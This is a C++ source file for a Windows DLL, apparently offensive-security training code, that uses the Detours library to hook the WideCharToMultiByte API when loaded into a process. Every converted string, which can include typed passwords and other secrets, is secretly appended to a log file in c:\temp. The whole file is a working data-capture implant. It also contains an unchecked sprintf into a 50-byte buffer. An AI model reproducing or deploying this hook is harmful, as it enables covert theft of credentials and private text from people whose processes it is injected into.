// author: reenz0h(twitter : @SEKTOR7net)

#include <stdio.h>
#include <windows.h>
#include "detours.h"
#pragma comment(lib, "user32.lib")

// pointer to original WideCharToMultiByte
int (WINAPI * pWideCharToMultiByte)(
  UINT                               CodePage,
  DWORD                              dwFlags,
  _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
  int                                cchWideChar,
  LPSTR                              lpMultiByteStr,
  int                                cbMultiByte,
  LPCCH                              lpDefaultChar,
  LPBOOL                             lpUsedDefaultChar
) = WideCharToMultiByte;

BOOL Hookem(void);
BOOL UnHookem(void);

// Hooking function
int HookedWideCharToMultiByte(
  UINT 								 CodePage,
  DWORD                              dwFlags,
  _In_NLS_string_(cchWideChar)LPCWCH lpWideCharStr,
  int                                cchWideChar,
  LPSTR                              lpMultiByteStr,
  int                                cbMultiByte,
  LPCCH                              lpDefaultChar,
  LPBOOL                             lpUsedDefaultChar
) {
	
	int ret;
	char buffer[50];
	HANDLE hFile = NULL;
	DWORD numBytes;
	
	// call original function
	ret = pWideCharToMultiByte(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
	sprintf(buffer, "Data = %s\n", lpMultiByteStr);
	//OutputDebugStringA(buffer);
	
	// store captured data in a file
	hFile = CreateFile("c:\\temp\\data.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		OutputDebugStringA("Error with log file!\n");
	else
		WriteFile(hFile, buffer, strlen(buffer), &numBytes, NULL);
	
	CloseHandle(hFile);
	
	return ret;
}

// Set hooks on WideCharToMultiByte
BOOL Hookem(void) {

    LONG err;

	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourAttach(&(PVOID&)pWideCharToMultiByte, HookedWideCharToMultiByte);
	err = DetourTransactionCommit();

	//OutputDebugStringA("WideCharToMultiByte() hooked!\n");
	
	return TRUE;
}

// Revert all changes to original code
BOOL UnHookem(void) {
	
	LONG err;
	
	DetourTransactionBegin();
	DetourUpdateThread(GetCurrentThread());
	DetourDetach(&(PVOID&)pWideCharToMultiByte, HookedWideCharToMultiByte);
	err = DetourTransactionCommit();

	//OutputDebugStringA("Hook removed from WideCharToMultiByte()\n");
	
	return TRUE;
}

extern "C" __declspec(dllexport) BOOL WINAPI DllMain(HINSTANCE hinst, DWORD dwReason, LPVOID reserved) {

    switch (dwReason)  {
		case DLL_PROCESS_ATTACH:
			Hookem();
			break;
			
		case DLL_THREAD_ATTACH:
			break;
			
		case DLL_THREAD_DETACH:
			break;
			
		case DLL_PROCESS_DETACH:
			UnHookem();
			break;
	}
	
    return TRUE;
}